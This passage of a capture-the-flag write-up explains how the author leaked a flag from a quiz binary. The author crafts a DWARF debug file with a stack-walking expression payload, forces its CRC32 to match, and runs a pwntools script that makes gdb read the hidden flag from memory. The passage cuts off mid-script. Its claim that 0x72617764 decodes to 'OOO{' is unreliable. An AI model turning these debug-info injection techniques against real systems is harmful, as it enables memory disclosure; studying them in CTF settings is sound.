  <span class=n>rand_map</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>mmap_random</span><span class=p>(</span><span class=mh>0x4C4B40uLL</span><span class=p>);</span>
  <span class=n>score</span> <span class=o>=</span> <span class=mf>0L</span><span class=n>L</span><span class=p>;</span>
  <span class=n>highscore</span> <span class=o>=</span> <span class=mf>5000L</span><span class=n>L</span><span class=p>;</span>
  <span class=n>byte_4045FF</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>

  <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&quot;/dev/urandom&quot;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
  <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>rand_data</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
  <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>rand_stack</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
  <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>heapvar</span><span class=o>-&gt;</span><span class=n>rand_heap</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
  <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>mmap_offset</span><span class=p>,</span> <span class=mi>3uLL</span><span class=p>);</span>
  <span class=n>mmap_offset</span> <span class=o>%=</span> <span class=mh>0x4C4B1CuLL</span><span class=p>;</span>

  <span class=n>stream</span> <span class=o>=</span> <span class=n>fopen</span><span class=p>(</span><span class=s>&quot;../../flag&quot;</span><span class=p>,</span> <span class=s>&quot;r&quot;</span><span class=p>);</span>
  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span> <span class=mf>0L</span><span class=n>L</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mf>0L</span><span class=n>L</span><span class=p>);</span>
  <span class=n>fgets</span><span class=p>(</span><span class=o>&amp;</span><span class=n>rand_map</span><span class=p>[</span><span class=n>mmap_offset</span><span class=p>],</span> <span class=mi>36</span><span class=p>,</span> <span class=n>stream</span><span class=p>);</span>
  <span class=n>rand_map</span><span class=p>[</span><span class=n>mmap_offset</span> <span class=o>+</span> <span class=mi>36</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
  <span class=n>fclose</span><span class=p>(</span><span class=n>stream</span><span class=p>);</span>

  <span class=n>rand_stack2</span> <span class=o>=</span> <span class=n>heapvar</span><span class=o>-&gt;</span><span class=n>rand_heap</span> <span class=o>^</span> <span class=n>rand_stack</span> <span class=o>^</span> <span class=n>rand_data</span> <span class=o>^</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=n>rand_map</span><span class=p>[</span><span class=n>mmap_offset</span><span class=p>];</span>
  <span class=n>mmap_offset</span> <span class=o>=</span> <span class=mi>-1LL</span><span class=p>;</span>

  <span class=c1>// Start the quizz</span>
  <span class=n>read_questions</span><span class=p>();</span>
  <span class=n>rand_swap</span><span class=p>((</span><span class=kr>__int64</span> <span class=o>*</span><span class=p>)</span><span class=n>questions</span><span class=p>,</span> <span class=mi>25uLL</span><span class=p>);</span>
  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
    <span class=c1>// ... (snip)</span>
  <span class=p>}</span>

  <span class=k>return</span> <span class=n>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>canary</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>We figure that the flag is stored at <code>&amp;rand_map[mmap_offset]</code> which is a random location in the memory, but we are provided variables in different locations in the memory which once xored together could leak the flag position.</p><div class=codehilite><pre><span></span><code><span class=w>  </span><span class=n>rand_stack2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>heapvar</span><span class=o>-&gt;</span><span class=n>rand_heap</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>rand_stack</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>rand_data</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=o>&amp;</span><span class=n>rand_map</span><span class=o>[</span><span class=n>mmap_offset</span><span class=o>]</span><span class=w></span>
</code></pre></div><p>Is equivalent to:</p><div class=codehilite><pre><span></span><code><span class=w>  </span><span class=o>&amp;</span><span class=n>rand_map</span><span class=o>[</span><span class=n>mmap_offset</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>heapvar</span><span class=o>-&gt;</span><span class=n>rand_heap</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>rand_stack</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>rand_data</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>rand_stack2</span><span class=w></span>
</code></pre></div><p>Thanks to gdb we can spot their exact location in memory at the moment of the crash, and write a small shellcode to retrieve it:</p><div class=codehilite><pre><span></span><code><span class=ch>#!/usr/bin/env python3</span>
<span class=kn>import</span> <span class=nn>struct</span>


<span class=k>def</span> <span class=nf>gen_file</span><span class=p>(</span><span class=n>sc</span><span class=p>):</span>
  <span class=n>data</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;debug_info.s&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
  <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;SHELLCODE_SIZE&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sc</span><span class=p>)))</span>
  <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;SHELLCODE&#39;</span><span class=p>,</span> <span class=s1>&#39;, &#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>hex</span><span class=p>,</span> <span class=n>sc</span><span class=p>)))</span>
  <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;debug_info.gen.s&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>


<span class=n>DW_OP_const1u</span>     <span class=o>=</span> <span class=mh>0x08</span>
<span class=n>DW_OP_const2u</span>     <span class=o>=</span> <span class=mh>0x0a</span>
<span class=n>DW_OP_const4u</span>     <span class=o>=</span> <span class=mh>0x0c</span>
<span class=n>DW_OP_const8u</span>     <span class=o>=</span> <span class=mh>0x0e</span>

<span class=n>DW_OP_dup</span>         <span class=o>=</span> <span class=mh>0x12</span>

<span class=n>DW_OP_or</span>          <span class=o>=</span> <span class=mh>0x21</span>
<span class=n>DW_OP_plus</span>        <span class=o>=</span> <span class=mh>0x22</span>
<span class=n>DW_OP_shl</span>         <span class=o>=</span> <span class=mh>0x24</span>
<span class=n>DW_OP_shr</span>         <span class=o>=</span> <span class=mh>0x25</span>
<span class=n>DW_OP_xor</span>         <span class=o>=</span> <span class=mh>0x27</span>

<span class=n>DW_OP_deref</span>       <span class=o>=</span> <span class=mh>0x06</span>
<span class=n>DW_OP_reg7</span>        <span class=o>=</span> <span class=mh>0x57</span> <span class=c1># rsp</span>
<span class=n>DW_OP_breg7</span>       <span class=o>=</span> <span class=mh>0x77</span> <span class=c1># rsp</span>
<span class=n>DW_OP_piece</span>       <span class=o>=</span> <span class=mh>0x93</span>
<span class=n>DW_OP_stack_value</span> <span class=o>=</span> <span class=mh>0x9f</span>
<span class=n>DW_OP_push_object_address</span> <span class=o>=</span> <span class=mh>0x97</span>

<span class=c1># Shellcode starts here</span>
<span class=n>sc</span> <span class=o>=</span> <span class=p>[]</span>

<span class=c1># Get the 3rd random value in the heap at [[rsp + 8*23] + 0x10]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_breg7</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_const1u</span><span class=p>,</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>23</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_plus</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_deref</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_const1u</span><span class=p>,</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>2</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_plus</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_deref</span><span class=p>]</span>

<span class=c1># Get the 2nd random value at [rsp + 8*19]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_breg7</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_const1u</span><span class=p>,</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>19</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_plus</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_deref</span><span class=p>]</span>

<span class=c1># xor them</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_xor</span><span class=p>]</span>

<span class=c1># Get the 1st random value at offset 0x404100 in .data</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_const8u</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_deref</span><span class=p>]</span>

<span class=c1># xor them</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_xor</span><span class=p>]</span>

<span class=c1># Get the last value at [rsp]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_breg7</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_const1u</span><span class=p>,</span> <span class=mi>0</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_plus</span><span class=p>]</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_deref</span><span class=p>]</span>

<span class=c1># xor them</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_xor</span><span class=p>]</span>

<span class=c1># get the address</span>
<span class=n>sc</span> <span class=o>+=</span> <span class=p>[</span><span class=n>DW_OP_stack_value</span><span class=p>]</span>

<span class=n>gen_file</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span>
</code></pre></div><p>This looks great but while trying locally I stumbled on an issue where using the <code>DW_OP_stack_value</code> which uses the value on the top of the stack as the address would actually sign extend it and retrieve something as <code>0xffffffff41424344</code> for the flag address. I couldn't get rid of this and thus did not manage to have a successful <code>x/s</code> working and printing the entire flag as a string.</p><p>However, if we remove <code>DW_OP_stack_value</code> from our shellcode, <code>x/s</code> will leak the first 4 bytes of the flag, and thus we can simply repeat the operation by incrementing the pointer 4 by 4 (and I'm happy there are only 36 bytes to leak):</p><div class=codehilite><pre><span></span><code><span class=n>sc</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=o>[</span><span class=n>DW_OP_const1u, 4</span><span class=o>]</span><span class=w></span>
<span class=n>sc</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=o>[</span><span class=n>DW_OP_plus</span><span class=o>]</span><span class=w></span>
</code></pre></div><h2>Executing remotely</h2><p>Now we're ready, we can make sure our file does not contain any <code>\n</code> character and send it remotely. We quickly realise that the CRC does not match. Of course, we have to patch the CRC to the one that was hardcoded in the <code>trivia</code> binary i.e. <code>3d46c53b</code>. For that I used <a href=https://www.nayuki.io/res/forcing-a-files-crc-to-any-value/forcecrc32.py>this script</a> which would allow me to force a CRC32 for my input file (kudos to burrito, it is indeed faster than bruteforcing).</p><p>Tried it again, and whoops, it still didn't work. And for a good reason, after <code>fgets</code> is called, the character <code>\n</code> is added to the content of our file followed by the player's score divided by <code>0x64</code>! So I had to append my current score to the file first, force its CRC to the one we wanted, then remove it again so that the CRC matches when the remote binary appends our score to the file.</p><p>Here's my not-so-pretty but working script:</p><div class=codehilite><pre><span></span><code><span class=ch>#!/usr/bin/env python3</span>

<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=kn>import</span> <span class=nn>struct</span>
<span class=kn>import</span> <span class=nn>binascii</span>
<span class=kn>import</span> <span class=nn>forcecrc32</span>

<span class=n>answers</span> <span class=o>=</span> <span class=p>{}</span>
<span class=k>def</span> <span class=nf>readquestions</span><span class=p>():</span>
    <span class=n>data</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;questions.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&quot;</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=p>)):</span>
        <span class=n>q</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>x</span><span class=o>*</span><span class=mi>2</span><span class=p>]</span>
        <span class=n>a</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>x</span><span class=o>*</span><span class=mi>2</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span>
        <span class=n>answers</span><span class=p>[</span><span class=n>q</span><span class=p>]</span> <span class=o>=</span> <span class=n>a</span>

<span class=n>last_score</span> <span class=o>=</span> <span class=mi>0</span>

<span class=k>def</span> <span class=nf>question</span><span class=p>(</span><span class=n>minscore</span><span class=p>,</span> <span class=n>fail</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
    <span class=k>global</span> <span class=n>last_score</span>
    <span class=n>line</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
    <span class=k>if</span> <span class=n>line</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>:</span>
        <span class=k>return</span> <span class=kc>False</span>
    <span class=k>try</span><span class=p>:</span>
        <span class=n>score</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;:&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
        <span class=n>last_score</span> <span class=o>=</span> <span class=n>score</span>
    <span class=k>except</span><span class=p>:</span>
        <span class=nb>print</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
        <span class=k>return</span> <span class=kc>False</span>
    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>q</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=c1># question</span>
    <span class=k>if</span> <span class=ow>not</span> <span class=n>fail</span> <span class=ow>and</span> <span class=n>q</span> <span class=ow>in</span> <span class=n>answers</span><span class=p>:</span>
        <span class=n>answer</span> <span class=o>=</span> <span class=n>answers</span><span class=p>[</span><span class=n>q</span><span class=p>]</span>
    <span class=k>else</span><span class=p>:</span>
        <span class=n>answer</span> <span class=o>=</span> <span class=s1>&#39;UNK&#39;</span>
    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>answer</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
    <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
    <span class=n>res</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;WRONG&#39;</span> <span class=ow>in</span> <span class=n>res</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>fail</span><span class=p>:</span>
        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Wrong answer for &quot;</span><span class=si>{</span><span class=n>q</span><span class=si>}</span><span class=s1>&quot; (sent &quot;</span><span class=si>{</span><span class=n>answer</span><span class=si>}</span><span class=s1>&quot;)&#39;</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>score</span> <span class=o>&lt;=</span> <span class=n>minscore</span> <span class=ow>or</span> <span class=n>fail</span>

<span class=c1># Init answers and socket</span>
<span class=n>readquestions</span><span class=p>()</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;exploit-for-dummies.challenges.ooo&#39;</span><span class=p>,</span> <span class=mi>5000</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;spawn the service up for you.</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span> <span class=c1># starting...</span>
<span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span> <span class=c1># cd</span>
<span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span> <span class=c1># ./trivia</span>

<span class=c1># Answer correctly to questions</span>
<span class=k>def</span> <span class=nf>play</span><span class=p>(</span><span class=n>score</span><span class=o>=</span><span class=mi>5000</span><span class=p>):</span>
    <span class=n>run</span> <span class=o>=</span> <span class=kc>True</span>
    <span class=k>while</span> <span class=n>run</span><span class=p>:</span>
        <span class=n>run</span> <span class=o>=</span> <span class=n>question</span><span class=p>(</span><span class=n>score</span><span class=p>)</span>

    <span class=c1># Minimum score is reached, abort asap</span>
    <span class=n>run</span> <span class=o>=</span> <span class=kc>True</span>
    <span class=k>while</span> <span class=n>run</span><span class=p>:</span>
        <span class=n>run</span> <span class=o>=</span> <span class=n>question</span><span class=p>(</span><span class=n>score</span><span class=p>,</span> <span class=kc>True</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>save_score</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;save your score? (yes/no)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;yes&#39;</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Name:&#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
    <span class=k>if</span> <span class=n>name</span> <span class=o>==</span> <span class=s1>&#39;questions.txt&#39;</span><span class=p>:</span>
        <span class=k>return</span>
    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Your Name&#39;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;CRC:&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>binascii</span><span class=o>.</span><span class=n>crc32</span><span class=p>(</span><span class=n>data</span><span class=p>)),</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
    <span class=c1># \n included in data for CRC match</span>
    <span class=k>assert</span> <span class=n>data</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=mh>0x0a</span>
    <span class=n>x</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Sent&#39;</span><span class=p>,</span> <span class=n>x</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;play again? (yes/no)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;yes&#39;</span><span class=p>)</span>

<span class=c1># Now make it segfault and send data</span>
<span class=k>def</span> <span class=nf>dump</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
    <span class=n>save_score</span><span class=p>(</span><span class=s1>&#39;questions.txt&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;continue&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Address&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>

    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;x/s &#39;</span> <span class=o>+</span> <span class=n>payload</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span>
    <span class=n>gdb_data</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=s1>&#39;:&#39;</span><span class=p>)</span>
    <span class=n>addr</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>gdb_data</span><span class=o>.</span><span class=n>decode</span><span class=p>(),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>addr</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>


<span class=c1>### </span>
<span class=n>score</span> <span class=o>=</span> <span class=n>play</span><span class=p>()</span>
<span class=nb>print</span><span class=p>(</span><span class=s1>&#39;your score is&#39;</span><span class=p>,</span> <span class=n>last_score</span><span class=p>)</span>
<span class=n>score</span> <span class=o>=</span> <span class=n>last_score</span> <span class=o>//</span> <span class=mh>0x64</span>
<span class=n>data</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./trivia.debug&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
<span class=n>data</span> <span class=o>=</span> <span class=n>data</span> <span class=o>+</span> <span class=nb>int</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=n>score</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span>
<span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./trivia.debug.sent&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
<span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;python3 forcecrc32.py ./trivia.debug.sent 304 3d46c53b&#39;</span><span class=p>)</span> <span class=c1># I&#39;m not proud but that&#39;s how I did it</span>
<span class=n>save_score</span><span class=p>(</span><span class=s1>&#39;trivia.debug&#39;</span><span class=p>,</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./trivia.debug.sent&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
<span class=n>play</span><span class=p>(</span><span class=n>last_score</span><span class=p>)</span>
<span class=n>dump</span><span class=p>(</span><span class=s1>&#39;0x0+first&#39;</span><span class=p>)</span> <span class=c1># Leak the symbol &#39;first&#39;</span>
</code></pre></div><p>Et voil! After a while we can see the following:</p><div class=codehilite><pre><span></span><code><span class=o>...</span>
<span class=n>warning</span><span class=p>:</span> <span class=n>section</span> <span class=o>.</span><span class=n>bss</span> <span class=ow>not</span> <span class=n>found</span> <span class=ow>in</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>dummies</span><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>dir_4912804</span><span class=o>/</span><span class=n>trivia</span><span class=o>.</span><span class=n>debug</span>
<span class=p>[</span><span class=n>New</span> <span class=n>LWP</span> <span class=mi>37</span><span class=p>]</span>
<span class=n>Core</span> <span class=n>was</span> <span class=n>generated</span> <span class=n>by</span> <span class=err>`</span><span class=o>./</span><span class=n>trivia</span><span class=s1>&#39;.</span>
<span class=n>Program</span> <span class=n>terminated</span> <span class=n>with</span> <span class=k>signal</span> <span class=n>SIGSEGV</span><span class=p>,</span> <span class=n>Segmentation</span> <span class=n>fault</span><span class=o>.</span>
<span class=c1>#0  0x00007fc068c97f5b in _IO_new_fclose (fp=0x0) at iofclose.c:48</span>
<span class=mi>48</span>    <span class=n>iofclose</span><span class=o>.</span><span class=n>c</span><span class=p>:</span> <span class=n>No</span> <span class=n>such</span> <span class=n>file</span> <span class=ow>or</span> <span class=n>directory</span><span class=o>.</span>
<span class=p>(</span><span class=n>gdb</span><span class=p>)</span> <span class=mh>0x72617764</span><span class=p>:</span>    <span class=o>&lt;</span><span class=n>error</span><span class=p>:</span> <span class=n>Cannot</span> <span class=n>access</span> <span class=n>memory</span> <span class=n>at</span> <span class=n>address</span> <span class=mh>0x72617764</span><span class=o>&gt;</span><span class=err>`</span>
</code></pre></div><p>And as you would have guessed already, <code>0x72617764</code> in little-endian corresponds to the characters <code>OOO{</code> which is the mark of the beginning of the flag. All I had to do now was to adjust the shellcode to read the bytes 4 by 4 until the full flag is leaked:</p><div class=codehilite><pre><span></span><code><span class=n>p32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=n>x</span><span class=p>)</span>
